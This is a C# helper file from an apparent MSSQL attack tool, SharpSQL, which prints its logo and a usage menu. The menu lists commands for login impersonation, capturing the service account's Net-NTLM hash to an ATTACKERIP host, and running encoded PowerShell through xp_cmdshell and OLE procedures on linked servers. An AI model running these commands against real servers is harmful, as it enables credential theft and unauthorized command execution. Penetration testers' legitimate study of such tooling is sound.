using System;

namespace SharpSQL.Helpers
{
    public static class Info
    {
        public static void ShowLogo()
        {


            Console.WriteLine("\r\n███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██      ");
            Console.WriteLine("██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██      ");
            Console.WriteLine("███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██      ");
            Console.WriteLine("     ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██      ");
            Console.WriteLine("███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████ ");
            Console.WriteLine("                                                    ▀▀           ");
            Console.WriteLine("Written By: Jb05s | Version: 1.0.0 \r\n");



        }

        public static void ShowUsage()
        {
            string usage = @"
MSSQL Authenticated Server Enumeration and Impersonation:

    [1] Retrieve a List of Linked SQL Servers on the Connected SQL Server:
            SharpSQL.exe getlinked /db:DATABASE /server:SERVER
    [2] Retrieve Information on SQL Login, Mapped User, and Available User Roles:
            SharpSQL.exe getdbuser /db:DATABASE /server:SERVER [/impersonate]
    [3] Retrieve SQL Logins Available for Impersonation and Impersonate the Available Login:
            SharpSQL.exe getlogin /db:DATABASE /server:SERVER [/impersonate]
    [4] Retrieve the Net-NTLM Hash for the Service Account of the Connected SQL Server:
            SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP

MSSQL Command Execution:

    [1] Execute Encoded PowerShell Command via 'xp_cmdshell':
            SharpSQL.exe xp /db:DATABASE /server:SERVER /command:COMMAND
    [2] Execute Encoded PowerShell Command via 'Ole Automation Procedures':
            SharpSQL.exe ole /db:DATABASE /server:SERVER /command:COMMAND

MSSQL Linked Server Command Execution:

    [1] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell' with 'OPENQUERY':
            SharpSQL.exe linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND
    [2] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell':
            SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND

MSSQL Double Linked Server Command Execution:

    [1] Execute Encoded PowerShell Command on a Double Linked SQL Server via 'xp_cmdshell':
            SharpSQL.exe dbllinkedxp /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE /target:TARGET /command:COMMAND
";
            Console.WriteLine(usage);
        }
    }
}